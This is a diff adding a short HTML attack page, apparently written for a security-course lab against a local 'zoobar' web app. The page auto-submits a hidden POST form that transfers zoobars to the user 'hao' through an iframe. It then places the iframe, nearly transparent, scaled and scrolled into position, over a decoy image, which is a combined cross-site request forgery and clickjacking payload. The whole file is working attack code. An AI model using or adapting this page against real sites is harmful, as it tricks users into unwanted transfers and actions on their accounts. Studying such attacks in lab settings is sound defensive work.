@@ -1,0 +1,65 @@
+<html>
+<head>
+<title>cj</title>
+</head>
+<style>
+#myiframe { 
+	width: 600px;
+	height: 600px;
+	zoom: 5;
+	-moz-transform: scale(5);
+	-moz-transform-origin: 0 ;
+
+}
+#div_iframe {
+	opacity:0.1;
+	overflow: scroll;
+	overflow-x:hidden;
+	overflow-y:hidden;
+	height: 220px;
+	width: 330px;
+	-moz-transform: scale(7,11);
+	-moz-transform-origin: 0 ;
+	border:none;
+	position: absolute;
+	left: 0px;
+	top: 0px;
+	z-index:2;
+}
+#bottom_div{
+	position: absolute;
+	left: 0px;
+	top: 0px;
+	z-index:1;
+
+}
+#bottom_image{
+	width:600px;
+	height:500px;
+
+}
+</style>
+     <body>
+	  <div id='div_iframe'>
+          <iframe id="myiframe" width=600px height=400px name="iframe1" frameborder="0"></iframe>
+	  <form method=POST name=form id=transferform target="iframe1" action="http://127.0.0.1/myzoo/transfer.php">
+	  	<input name=zoobars type=hidden value="1">
+          	<input name=recipient type=hidden value="hao">
+                <input type=hidden name=submission value="Send">
+	  </form>
+	  <script>
+		  document.getElementById("transferform").submit();
+	  </script>
+	  </div>
+	  <!-- <div> <button id=button1 type="button">Click Me!</button> </div> -->
+	  <script>
+		  document.getElementById('div_iframe').scrollTop = 290;
+		  document.getElementById('div_iframe').scrollLeft = 860;
+	  </script>
+	  </div>
+	  <div id='bottom_div'>
+	  <img id="bottom_img" src=http://127.0.0.1/1.png>
+	  
+
+     </body>
+</html>
